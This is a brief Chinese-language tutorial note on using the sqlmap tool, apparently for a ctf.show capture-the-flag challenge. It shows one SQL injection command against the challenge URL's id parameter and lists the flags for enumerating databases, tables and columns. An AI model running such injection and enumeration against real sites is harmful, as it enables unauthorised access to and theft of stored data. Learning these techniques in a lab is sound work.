# sqlmap使用

<br>



### 第一步：开始脚本注入

<br>


* 使用sqlmap -u url来进行注入

sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id="

<br>

### 第二步：查表

<br>

* 查表常用参数
````
常用参数
--dbs 所有数据库
--tables 所有表
--columns 所有列

````